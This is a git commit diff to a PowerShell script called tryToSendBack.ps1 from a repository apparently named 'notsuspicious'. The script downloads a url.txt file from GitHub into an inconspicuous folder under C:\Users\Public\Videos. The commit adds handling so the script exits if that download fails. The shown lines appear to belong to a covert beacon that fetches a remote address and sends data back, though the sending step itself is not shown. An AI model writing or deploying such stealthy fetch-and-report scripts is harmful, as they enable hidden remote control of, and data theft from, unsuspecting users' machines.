07c5af3c4278ef133509626d604d5bf45078f3b4
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-03-01 12:23:20 +0100

    Update tryToSendBack.ps1

--- tryToSendBack.ps1
+++ tryToSendBack.ps1
@@ -1,10 +1,18 @@
 $urlFilePath = 'C:\Users\Public\Videos\GraphicalUserInterface\url.txt'
+$downloadAttempted = $false
 
 try {
     # Check if url.txt file already exists
     if (-not (Test-Path $urlFilePath)) {
         # Download url.txt if it doesn't exist
         Invoke-WebRequest 'https://github.com/RaupenInspektor/notsuspicious/raw/main/url.txt' -OutFile $urlFilePath
+        $downloadAttempted = $true
+    }
+
+    # If the download was attempted and url.txt still doesn't exist, exit the script
+    if ($downloadAttempted -and -not (Test-Path $urlFilePath)) {
+        Write-Host "Failed to download url.txt"
+        exit
     }
 
     # Execute the tryToSendBack.ps1 script content
